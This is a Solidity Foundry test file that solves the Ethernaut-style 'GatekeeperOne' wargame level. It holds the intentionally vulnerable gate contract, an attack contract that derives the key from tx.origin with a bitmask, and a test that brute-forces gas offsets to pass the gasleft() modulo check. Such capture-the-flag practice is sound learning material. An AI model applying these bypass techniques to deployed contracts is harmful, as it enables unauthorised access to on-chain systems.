// SPDX-License-Identifier: MIT
pragma solidity >=0.6.2;
pragma experimental ABIEncoderV2;

import {BaseTest} from "test/utils/BaseTest.t.sol";
import {console2} from "forge-std/console2.sol";

contract GatekeeperOne {

  address public entrant;
  /* 通过合约调用 GatekeeperOne.enter */
  modifier gateOne() {
    require(msg.sender != tx.origin);
    _;
  }

  
  modifier gateTwo() {
    require(gasleft() % 8191 == 0);
    _;
  }

  modifier gateThree(bytes8 _gateKey) {
      require(uint32(uint64(_gateKey)) == uint16(uint64(_gateKey)), "GatekeeperOne: invalid gateThree part one");
      require(uint32(uint64(_gateKey)) != uint64(_gateKey), "GatekeeperOne: invalid gateThree part two");
      require(uint32(uint64(_gateKey)) == uint16(uint160(tx.origin)), "GatekeeperOne: invalid gateThree part three");
    _;
  }

  function enter(bytes8 _gateKey) public gateOne gateTwo gateThree(_gateKey) returns (bool) {
    entrant = tx.origin;
    return true;
  }
}

contract Solution {
    address contractAddress;

    constructor(address _contractAddress) {
        contractAddress = _contractAddress;
    }

    function Attack() external returns (bool) {
        bytes8 key = bytes8(uint64(uint160(tx.origin))) & 0xFFFFFFFF0000FFFF;
        (bool success,) = contractAddress.call(abi.encodeWithSignature("enter(bytes8)", key));
        return success;
    }
}   

contract GatekeeperOneTest is BaseTest {

    GatekeeperOne public gatekeeperOne;
    Solution public solution;

    function setUp() public override {
        super.setUp();
        gatekeeperOne = new GatekeeperOne();
        solution = new Solution(address(gatekeeperOne));
    }

    function test_Attack_fail() public {
        vm.startBroadcast(deployer);
        uint gas = 8191*3 + 1464;
        bool success = solution.Attack{gas: gas}();
        assert(gatekeeperOne.entrant() == address(0));
        vm.stopBroadcast();
    }

    function test_Attack_gas() public {
        vm.startBroadcast(deployer);
        bool success;
        for(uint256 i = 1450; i < 1500; i++){
            uint gas = 8191*3 + i;
            success = solution.Attack{gas: gas}();
            if(success){
              console2.log("Success with gas", i);
              break;
            }
        }
        assertEq(gatekeeperOne.entrant(), deployer);
        vm.stopBroadcast();
    }
}